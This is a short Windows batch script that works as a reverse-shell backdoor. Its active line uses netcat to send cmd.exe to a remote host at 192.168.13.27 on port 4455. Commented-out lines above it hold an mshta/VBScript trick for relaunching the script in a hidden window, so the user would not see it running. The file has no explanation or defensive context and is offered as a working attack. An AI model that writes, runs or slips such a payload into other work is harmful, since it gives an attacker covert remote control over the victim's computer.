@echo off
:if "%1" == "h" goto begin
:mshta vbscript:createobject("wscript.shell").run("%~nx0 h",0)(window.close)&&exit
:begin
nc -e cmd.exe 192.168.13.27 4455
:exit